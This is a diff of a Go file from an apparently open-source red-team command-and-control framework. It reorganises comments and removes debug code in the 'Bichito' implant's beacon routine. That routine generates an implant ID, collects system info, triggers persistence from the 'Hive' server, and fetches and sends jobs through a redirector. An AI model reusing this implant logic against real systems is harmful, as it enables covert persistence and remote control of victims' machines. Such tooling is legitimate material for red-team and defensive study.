@@ -1,6 +1,6 @@
 //{{{{{{{ Bichito High-Level Communications with Redirector }}}}}}}
-
 //By Rebujacker - Alvaro Folgado Rueda as an open source educative project
+
 package main
 
 import (
@@ -14,31 +14,34 @@ import (
 	"time"
 )
 
-
-// A. Check if BID is correct, if not send checking Job
-// B. Retrieve Jobs from target redirector, if connection error return failure
-// C. Send Processed Jobs to target redirector,if connection error return failure
-
+/*
+Description: Implant Routine to connect to try a connection cycle with selected redirector
+Flow:
+A.Check if BID is present in memory, if not, generate one and build the first athentication header.Finish till next cycle.
+B.Check if sysinfo has been retrieved, if not:
+	B1.Execute target OS/Arch sysinfo module
+	B2.Wrappe a Job with retrieved sysinfo and add it to the on memory slice for Jobs to Hive
+C.Check if persistence modules are active,if so:
+	C1.Use target persistence module to check if Persistence is already present on the disk
+	C2.If not,wrap a Job to Hive with persistence state processing, this will trigge at Hive a persistence routine
+		to send back a binary to persist.
+D.Retrieve Jobs routine:
+	D1.Start a go routine to try to connect to redirector using selected network module,till timeout
+	D2.If any Jobs retrieved, send them to the on memory slice to be processed by the JobProcessor (./src/bichito/biJobs.go)
+E.Send Jobs routine:
+	E1.Start a go routine to try to connect to redirector using selected network module,till timeout
+	E2.Independently of succes of failure, flush the Jobs to Hive to avoid implants coms blockage
+*/
 func connectOut() string{
 	
 	var newJobs []*Job
 	var encodedJobs []byte
 	var error string
 		
-	//If Bid is not correct yet, send checking package again
-	//TO-DO: Remove checking??
+	//Check if BID is present, if not generate a new one for this implant,and return, this will generate a "Ping" within job processor to be sent to Hive
 	if !strings.Contains(bid,"B-"){
 
 		bid = fmt.Sprintf("%s%s","B-",randomString(8))
-
-		/*
-		jobChecking := &Job{"","","",bid,"BiChecking","","","",""}
-	
-		var jobsChecking = []*Job{jobChecking}
-        bufRC := new(bytes.Buffer)
-        json.NewEncoder(bufRC).Encode(jobsChecking)
-		resultRP := bufRC.String()
-		*/
 	
 		//Prepare Authentication with Bid for next Connections
 		biauth := BiAuth{bid,biconfig.Token}
@@ -48,10 +51,10 @@ func connectOut() string{
 		authbearer = resultRP
 		authbearer = strings.TrimSuffix(authbearer, "\n")
 
-		//Checking(redirector,authentication,bid,[]byte(resultRP))
 		return "Success"
 	}
 	
+	//Check if sysinfo was retrieved and sent to Hive correctly
 	if sysinfo != true {
 		
 		errorS,info := biterpreter.Sysinfo()
@@ -71,15 +74,13 @@ func connectOut() string{
 		sysinfo = true
 	}
 
+	//If persistence is active for this implant,check if its present in the foothold, and trigger or not a persistence flow
 	if !persisted{
 		
 		errorP1,alreadyP := persistence.CheckPersistence(biconfig.Persistence)
 		if errorP1{
 			addLog("Check Persistence error:"+alreadyP)
 		}
-
-		//Debug
-		//fmt.Println("Is Persisted?"+alreadyP)
 
 		if (alreadyP != "Persisted"){
 
@@ -94,6 +95,7 @@ func connectOut() string{
 		}
 	}
 
+	//Job retrieval routine
 	//5 sec Timeout to perform Job retrieve
 	var retrieveError string
 	retrieveTimeout := time.NewTimer(time.Duration(30) * time.Second)
@@ -131,13 +133,7 @@ func connectOut() string{
 	jobsToProcess.Jobs = append(jobsToProcess.Jobs,newJobs...)
 	jobsToProcess.mux.Unlock()
 	
-	
-	
-
-	//Debug: Jobs to be sent to Hive
-	//fmt.Println("Jobs to be sent to Hive: ")
-	//fmt.Println(jobsToHive.Jobs)
-
+	//Job send routine
 	//Encode Jobs
 	bufRC := new(bytes.Buffer)
 	json.NewEncoder(bufRC).Encode(jobsToHive.Jobs)
@@ -180,16 +176,3 @@ func connectOut() string{
 
 	return "Success"
 }
-
-/*
-//Prepare a Job to add a trace on Hive DB
-go func sendTrace(trace string){
-
-		jobtrace := &Job{"","","",bid,"trace","","Success",trace,""}
-
-		jobsToHive.mux.Lock()
-		jobsToHive.Jobs = append(jobsToHive.Jobs,jobsysinfo)
-		jobsToHive.mux.Unlock()
-
-}
-*/
